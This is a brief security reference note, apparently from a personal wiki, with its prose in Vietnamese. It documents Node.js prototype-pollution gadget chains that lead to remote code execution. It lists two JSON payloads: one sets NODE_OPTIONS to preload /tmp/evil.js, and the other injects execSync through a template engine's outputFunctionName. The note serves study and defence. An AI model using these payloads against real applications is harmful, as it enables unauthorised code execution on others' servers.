---
title: Node.js RCE Gadget Chains
type: entity
related: [[Server-Side Prototype Pollution (Node.js)]]
---

Các gadget chain được nhắc đến:

```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "node", "NODE_OPTIONS": "--require /tmp/evil.js"}}
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id')//"}}
```

Chúng minh họa cách polluted properties đi vào child_process hoặc template engine để dẫn đến RCE.